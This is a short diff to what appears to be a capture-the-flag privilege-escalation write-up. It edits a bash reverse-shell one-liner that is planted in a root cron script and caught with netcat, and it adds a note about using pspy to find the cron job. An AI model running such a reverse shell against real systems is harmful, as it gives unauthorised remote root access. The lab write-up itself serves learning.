@@ -189,7 +189,7 @@ By adding this payload to `/etc/print.sh` and then starting up our listener we c
 
 
 ```bash
-/bin/sh -i >& /dev/tcp/10.9.75.133/1337 0>&1
+/bin/sh -i >& /dev/tcp/10.9.75.133/4444 0>&1
 ```
 
 
@@ -201,7 +201,11 @@ Then start up your reverse shell using `netcat` and you should be root
 ![](https://i.imgur.com/OPuK6GJ.png)
 
 
+
+
 > **_Note :_** Generally i ran `pspy32s` in other to know that the **planner.sh** script was running as a cronjob
+
+
 
 Have fun 😁😎
 
